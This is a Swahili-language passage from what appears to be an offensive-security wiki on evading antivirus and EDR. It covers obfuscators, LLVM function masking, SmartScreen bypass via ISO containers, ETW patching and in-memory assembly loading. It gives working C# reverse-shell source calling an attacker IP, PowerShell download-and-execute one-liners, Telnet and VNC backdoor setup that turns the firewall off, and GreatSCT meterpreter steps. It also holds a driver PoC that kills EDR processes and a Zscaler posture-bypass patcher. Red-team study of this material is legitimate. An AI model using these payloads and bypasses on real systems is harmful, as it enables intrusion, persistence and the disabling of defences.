4.  Manual clean-up – endesha binary inayotokana ndani ya dnSpy, tafuta Base64 blobs kubwa au matumizi ya `RijndaelManaged`/`TripleDESCryptoServiceProvider` ili kupata *payload* halisi. Mara nyingi malware huihifadhi kama byte array iliyosimbwa kwa TLV na kuanzishwa ndani ya `<Module>.byte_0`.

Chain iliyo hapo juu hurejesha execution flow **bila kuhitaji kuendesha sample hasidi** – jambo muhimu unapofanya kazi kwenye workstation isiyo na mtandao.

> 🛈  ConfuserEx hutengeneza custom attribute inayoitwa `ConfusedByAttribute`, ambayo inaweza kutumiwa kama IOC ku-triage samples automatically.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa fork ya open-source ya [LLVM](http://www.llvm.org/) compilation suite inayoweza kutoa usalama ulioongezeka wa software kupitia [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) na kuzuia tampering.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kutengeneza code iliyofichwa wakati wa compilation, bila kutumia external tool yoyote na bila kurekebisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Huongeza layer ya operations zilizofichwa zinazozalishwa na C++ template metaprogramming framework, jambo linalofanya maisha ya mtu anayetaka ku-crack application kuwa magumu zaidi.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza kuficha pe files mbalimbali zikiwemo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni metamorphic code engine rahisi kwa arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni fine-grained code obfuscation framework kwa lugha zinazoungwa mkono na LLVM, inayotumia ROP (return-oriented programming). ROPfuscator huficha program katika kiwango cha assembly code kwa kubadilisha instructions za kawaida kuwa ROP chains, hivyo kuzuia dhana yetu ya kawaida ya control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyoandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor inaweza kubadilisha EXE/DLL zilizopo kuwa shellcode na kisha kuzipakia

### LLVM compiler-assisted per-function self-masking

Badala ya kuficha implant nzima wakati tu imelala, modified LLVM X86 backend inaweza kuweka functions zilizochaguliwa zikiwa XOR-masked kila zinapokuwa inactive. Function Peekaboo PoC huchagua majina yaliyodemangle yanayojumuisha `REG_`, huingiza position-independent entry/exit stubs kuzunguka machine code ya mwisho, na kutoa masking handler moja inayoshirikishwa katika `.text`; source-level signatures na Windows x64 calling convention hubaki bila kubadilika.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

Hii inapaswa kufanyika baada ya instruction selection na optimization kwa sababu transformation lazima ihusishe **kila return iliyotolewa** na ijue mpangilio halisi wa x86. `MachineFunctionPass` ya kabla ya emission hupata `MachineInstr::isReturn()` ya mwisho, huifuta ili njia ya mwisho ipitie kwenye epilogue iliyoongezwa, na hubadilisha returns za awali kuwa `JMP_1 handler`. Hifadhi stack/frame teardown yoyote iliyotengenezwa na compiler kabla ya kila return; redirect instruction ya return pekee.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` na `emitFunctionBodyEnd()` hutoa stubs za kila function, huku `emitEndOfAsmFile()` ikitoa handler. Symbols zinazoshirikiwa kati ya emission stages huruhusu prologue branch kulenga epilogue yake ya baadaye; kwa `je` ya near inayotolewa manually, andika `0F 84` ikifuatiwa na MC expression ya bytes nne `target - address_after_je`. Calls na jumps kwenda kwa handler zinaweza badala yake kutolewa kama objects za `MCInst` (`CALL64pcrel32` na `JMP_1`). Pass lazima irudishe `false` kwa function isiyochaguliwa ikiwa haikubadilisha chochote; PoC inarudisha `true` kimakosa kwenye njia hiyo.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

PoC huweka XOR key na records za bytes 16 zilizo na function pointer iliyorelocate na loader pamoja na runtime length katika `.funcmeta`. Ingawa C field ni `uint32_t`, handler hufikia QWORD kwenye record offset `+8`, ikitumia length pamoja na padding yake, na husogeza records kwa `0x10`. PE section names zina nafasi ya bytes nane pekee, kwa hiyo runtime lookup huona `.funcmet`. External patcher huongeza executable `.stub`, huhifadhi old entry-point RVA katika stub, na huelekeza `AddressOfEntryPoint`; PIC stub hupata image base kutoka `gs:[0x60]` → `[PEB+0x10]`, hupitia PE32+ imports ili kutatua `VirtualProtect` ambayo tayari ime-importiwa, na huendesha kabla ya CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Initialization huweka sentinel katika `gs:[0xE8]` na kuita kila metadata function. Prologue yake inayosomeka daima huandika function start katika `gs:[0xF0]`, hutambua sentinel, na kuruka body ambayo bado iko clear. Kisha epilogue hutumia `call handler`; baada ya handler kuhifadhi registers 13 (`0x68` bytes), return address iliyo kwenye `[rsp+0x68]` huwa mwisho wa function iliyobadilishwa, hivyo `end - start` inaweza kuandikwa katika metadata record yake. Stub huondoa sentinel na kuruka kwenda `ImageBase + original_entry_point_RVA` baada ya bodies zote kufichwa.<sup>[[38]](#references)[[39]](#references)</sup>

Wakati wa normal call, prologue huita symmetric handler huyo huyo ili ku-decode body. Njia ya mwisho huingia kwenye epilogue iliyoongezwa, huku kila return ya awali ikiruka moja kwa moja kwenda kwa shared handler. Normal epilogue pia hutumia `jmp handler` badala ya `call`, kwa hiyo baada ya handler kufanya re-masking, `ret` ya handler hutumia return address ya original caller na kuhifadhi function result katika `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

Handler hupata current record, huruka visible prologue isiyobadilika (`0x46` bytes katika build hii), hubadilisha sehemu iliyobaki kuwa `PAGE_EXECUTE_READWRITE`, huifanya XOR byte-by-byte kwa low key byte, na kisha huiweka kuwa `PAGE_EXECUTE_READ`. Kwa hiyo loop hiyo hiyo hufanya decoding wakati wa kuingia na encoding kwenye kila normal exit.<sup>[[38]](#references)[[39]](#references)</sup>

Indicators zenye signal kubwa za design hii zinajumuisha:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point iliyo ndani ya executable `.stub` na section ya `.funcmet` iliyo na key pamoja na `.text` pointers zilizorelocate;
- PEB, import-table, na section-table parsing kabla ya CRT, ikifuatiwa na calls kupitia kila metadata pointer;
- PIC prologues zinazofanana za `call`/`pop` na return sites nyingi zilizoelekezwa kwenye handler mmoja;
- writes kwenda `gs:[0xE8]`, `gs:[0xF0]`, na `gs:[0xF8]` zikifuatiwa na `VirtualProtect` transitions zinazorudiwa na bytewise XOR writes ndani ya executable pages zinazoungwa mkono na image.

Hii ni memory-scanner evasion, si cryptographic protection: patched file bado ina original clear body, na debugger inaweza kuweka breakpoint kwenye `VirtualProtect` au XOR loop na kudump active function. Single-byte XOR, readable metadata, na fixed `0x46` boundary pia hufanya offline recovery kuwa rahisi.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> TEB slots za PoC ni thread-local lakini modified code pages ni process-wide. Kwa hiyo concurrent au recursive entry inaweza kuwasha na kuzima instructions tena wakati invocation nyingine inaendelea; exceptions na nonlocal exits pia zinaweza kuruka re-masking. Implementation imara lazima isynchronize transitions, irejeshe protection iliyorejeshwa kupitia `lpflOldProtect`, iepuke stub lengths zilizowekwa hard-coded, ikague paths zote za `call` na `jmp` kwa x64 stack alignment, na iite `FlushInstructionCache` baada ya kuandika upya executable bytes. Microsoft inaweka wazi kwamba caller anawajibika kwa instruction-cache coherency wakati executable code inabadilishwa.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Huenda umewahi kuona screen hii unapopakua baadhi ya executables kutoka internet na kuzitekeleza.

Microsoft Defender SmartScreen ni security mechanism inayolenga kumlinda end user dhidi ya kuendesha applications zinazoweza kuwa malicious.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen hufanya kazi hasa kwa reputation-based approach, ikimaanisha kwamba applications zisizopakuliwa mara kwa mara zita-trigger SmartScreen, hivyo kumu-alert na kumzuia end user kutekeleza file (ingawa file bado inaweza kutekelezwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) yenye jina la Zone.Identifier, ambayo huundwa automatically wakati files zinapopakuliwa kutoka internet, pamoja na URL iliyopakuliwa kutoka.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kuangalia Zone.Identifier ADS ya file lililopakuliwa kutoka internet.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kutambua kwamba executables zilizosainiwa kwa signing certificate **inayoaminika** **hazita-trigger SmartScreen**.

Njia yenye ufanisi mkubwa ya kuzuia payloads zako kupata Mark of The Web ni kuzipackage ndani ya aina fulani ya container kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwenye volumes **zisizo za NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni tool inayopackage payloads kwenye output containers ili kukwepa Mark-of-the-Web.

Mfano wa matumizi:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hapa kuna demo ya kubypass SmartScreen kwa kuweka payloads ndani ya faili za ISO kwa kutumia [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni mfumo madhubuti wa logging katika Windows unaoruhusu applications na system components **kuweka kumbukumbu za events**. Hata hivyo, unaweza pia kutumiwa na security products kufuatilia na kugundua shughuli hasidi.

Kama ilivyo kwa kuzima (kubypass) AMSI, inawezekana pia kuifanya function ya **`EtwEventWrite`** ya user space process irudi mara moja bila kuweka kumbukumbu za events. Hili hufanywa kwa kupatch function hiyo kwenye memory ili irudi mara moja, na hivyo kuzima logging ya ETW kwa process hiyo.

Unaweza kupata maelezo zaidi katika **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) na [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Kupakia C# binaries kwenye memory kumejulikana kwa muda mrefu, na bado ni njia nzuri sana ya kuendesha post-exploitation tools zako bila kugunduliwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja kwenye memory bila kugusa disk, tutahitaji tu kuhangaikia kupatch AMSI kwa process nzima.

C2 frameworks nyingi (sliver, Covenant, metasploit, CobaltStrike, Havoc, n.k.) tayari zina uwezo wa kuexecute C# assemblies moja kwa moja kwenye memory, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

Inahusisha **kuanzisha sacrificial process mpya**, kuinject malicious code yako ya post-exploitation kwenye process hiyo mpya, kuexecute malicious code yako na, baada ya kumaliza, kuua process hiyo mpya. Hii ina faida na hasara zake. Faida ya njia ya fork and run ni kwamba execution hufanyika **nje ya** process yetu ya Beacon implant. Hii inamaanisha kwamba ikiwa kuna kitu kitaenda vibaya au kikagunduliwa wakati wa post-exploitation action yetu, kuna **uwezekano mkubwa zaidi** wa **implant yetu kuendelea kuwepo.** Hasara ni kwamba una **uwezekano mkubwa zaidi** wa kugunduliwa na **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Inahusu kuinject malicious code ya post-exploitation **kwenye process yake yenyewe**. Kwa njia hii, unaweza kuepuka kuunda process mpya na kuifanya ichanganuliwe na AV, lakini hasara ni kwamba ikiwa kuna kitu kitaenda vibaya wakati wa kuexecute payload yako, kuna **uwezekano mkubwa zaidi** wa **kupoteza beacon yako** kwa sababu inaweza kucrash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ikiwa ungependa kusoma zaidi kuhusu kupakia C# Assembly, tafadhali soma article hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na InlineExecute-Assembly BOF yao ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**; angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [video ya S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kuexecute malicious code kwa kutumia languages nyingine kwa kuipa machine iliyocompromise access **kwenye interpreter environment iliyosakinishwa kwenye Attacker Controlled SMB share**.

Kwa kuruhusu access kwenye Interpreter Binaries na environment iliyo kwenye SMB share, unaweza **kuexecute arbitrary code katika languages hizi ndani ya memory** ya machine iliyocompromise.

Repo inaeleza: Defender bado huchanganua scripts, lakini kwa kutumia Go, Java, PHP n.k. tunapata **unyumbufu zaidi wa kubypass static signatures**. Testing kwa kutumia random reverse shell scripts zisizo-obfuscate katika languages hizi kumefaulu.

## TokenStomping

Token stomping hubadilisha access token ya security product kama vile EDR au AV. Kupunguza privileges za token kunaweza kuacha process ikiendelea kufanya kazi huku ikiizuia kutekeleza privileged inspection au remediation actions.

Ili kuzuia hili, Windows inaweza **kuzuia external processes** kupata handles za tokens za security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kama ilivyoelezwa katika [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi ku-deploy Chrome Remote Desktop kwenye PC ya victim na kisha kuitumia ku-takeover na kudumisha persistence:<sup>[[35]](#references)</sup>
1. Download kutoka https://remotedesktop.google.com/, bofya "Set up via SSH", kisha bofya MSI file ya Windows ili kudownload MSI file.
2. Endesha installer kimya kwenye victim (admin inahitajika): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye ukurasa wa Chrome Remote Desktop na ubofye next. Wizard itakuomba uauthorize; bofya kitufe cha Authorize ili kuendelea.
4. Execute command iliyotolewa pamoja na adjustments zinazohitajika: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parameter ya `--pin` huweka PIN bila kutumia GUI).


## Advanced Evasion

Evasion ni mada tata sana; wakati mwingine inabidi uzingatie vyanzo vingi tofauti vya telemetry katika system moja tu, kwa hiyo ni karibu haiwezekani kubaki bila kugunduliwa kabisa katika mature environments.

Kila environment unayolenga itakuwa na strengths na weaknesses zake.

Ninakuhimiza sana uangalie talk hii kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili upate msingi wa kuelewa Advanced Evasion techniques zaidi.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Hii pia ni talk nyingine nzuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), ambayo **itaondoa sehemu za binary** hadi **igundue ni sehemu ipi Defender** inaona kuwa ni hasidi, kisha ikugawie sehemu hiyo.\
Tool nyingine inayofanya **jambo hilo hilo ni** [**avred**](https://github.com/dobin/avred), ikiwa na web service ya wazi katika [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, Windows zote zilikuja na **Telnet server** ambayo ungeweza kusakinisha (kama administrator) kwa kufanya:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Ifanye ianze mfumo unapoanzishwa na iendeshe sasa:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Badilisha port ya telnet** (stealth) na uzime firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unataka bin downloads, si setup)

**KWENYE HOST**: Tekeleza _**winvnc.exe**_ na configure server:

- Enable option _Disable TrayIcon_
- Weka password katika _VNC Password_
- Weka password katika _View-Only Password_

Kisha, hamisha binary _**winvnc.exe**_ na file **UltraVNC.ini** iliyoundwa **hivi karibuni** ndani ya **victim**

#### **Reverse connection**

**attacker** anapaswa **kutekeleza ndani ya** **host** yake binary `vncviewer.exe -listen 5900`, ili iwe **tayari** kupokea **VNC connection** ya reverse. Kisha, ndani ya **victim**: Anzisha winvnc daemon `winvnc.exe -run` na utekeleze `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Ili kudumisha stealth, hupaswi kufanya mambo machache

- Usianzishe `winvnc` ikiwa tayari inaendesha, vinginevyo utasababisha [popup](https://i.imgur.com/1SROTTl.png). Angalia ikiwa inaendesha kwa `tasklist | findstr winvnc`
- Usianzishe `winvnc` bila `UltraVNC.ini` katika directory hiyo hiyo, vinginevyo itasababisha [the config window](https://i.imgur.com/rfMQWcf.png) kufunguka
- Usiendeshe `winvnc -h` kwa ajili ya help, vinginevyo utasababisha [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pakua kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Ndani ya GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sasa **anzisha lister** kwa `msfconsole -r file.rc` na **tekeleza** **xml payload** kwa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Defender wa sasa atamaliza process haraka sana.**

### Ku-compile reverse shell yetu wenyewe

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Reverse shell ya kwanza ya C#

I-compile kwa kutumia:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Tumia pamoja na:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# kwa kutumia compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Upakuaji na utekelezaji wa kiotomatiki:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia python kwa mfano wa kutengeneza injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Tools nyingine
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Zaidi

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kuua AV/EDR Kutoka Kernel Space

Storm-2603 ilitumia console utility ndogo inayojulikana kama **Antivirus Terminator** kuzima ulinzi wa endpoint kabla ya kupeleka ransomware. Tool hii huleta **driver yake iliyo vulnerable lakini *signed*** na kuitumia vibaya kutekeleza kernel operations zenye privileges ambazo hata huduma za AV za Protected-Process-Light (PPL) haziwezi kuzuia.<sup>[[12]](#references)</sup>

Mambo muhimu
1. **Signed driver**: Faili inayowasilishwa kwenye disk ni `ServiceMouse.sys`, lakini binary hiyo ni driver iliyosainiwa kihalali `AToolsKrnl64.sys` kutoka kwenye “System In-Depth Analysis Toolkit” ya Antiy Labs. Kwa sababu driver hiyo ina Microsoft signature halali, hupakiwa hata wakati Driver-Signature-Enforcement (DSE) imewezeshwa.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Mstari wa kwanza husajili driver kama **kernel service**, na wa pili huianzisha ili `\\.\ServiceMouse` iweze kufikiwa kutoka user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Kusitisha process yoyote kwa kutumia PID (hutumika kuua huduma za Defender/EDR) |
| `0x990000D0` | Kufuta faili yoyote kwenye disk |
| `0x990001D0` | Ku-unload driver na kuondoa service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Kwa nini inafanya kazi**: BYOVD hupita ulinzi wa user-mode kabisa; code inayotekelezwa kwenye kernel inaweza kufungua process zilizolindwa, kuzisitisha, au kuchezea kernel objects bila kujali PPL/PP, ELAM au hardening features nyingine.

Detection / Mitigation
•  Wezesha Microsoft’s vulnerable-driver block list (`HVCI`, `Smart App Control`) ili Windows ikatae kupakia `AToolsKrnl64.sys`.
•  Fuatilia uundaji wa *kernel* services mpya na utoe alert driver inapopakiwa kutoka kwenye directory inayoweza kuandikwa na kila mtu au ikiwa haipo kwenye allow-list.
•  Fuatilia user-mode handles zinazoelekea kwenye custom device objects zikifuatiwa na `DeviceIoControl` calls zinazotiliwa shaka.

### Kupita Zscaler Client Connector Posture Checks kwa Patching Binary Zilizo Kwenye Disk

**Client Connector** ya Zscaler hutumia device-posture rules ndani ya kifaa na hutegemea Windows RPC kuwasilisha matokeo kwa components nyingine. Chaguo mbili dhaifu za design hufanya bypass kamili iwezekane:

1. Posture evaluation hufanyika **kabisa upande wa client** (boolean hutumwa kwa server).
2. Internal RPC endpoints huhakiki tu kwamba executable inayounganisha **imesainiwa na Zscaler** (kupitia `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Kwa **kupatch binaries nne zilizosainiwa kwenye disk**, mechanisms zote mbili zinaweza kuzimwa:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Daima hurudisha `1`, hivyo kila check huonekana kuwa compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ process yoyote (hata isiyosainiwa) inaweza ku-bind kwenye RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Hubadilishwa na `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Hukatizwa mapema |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
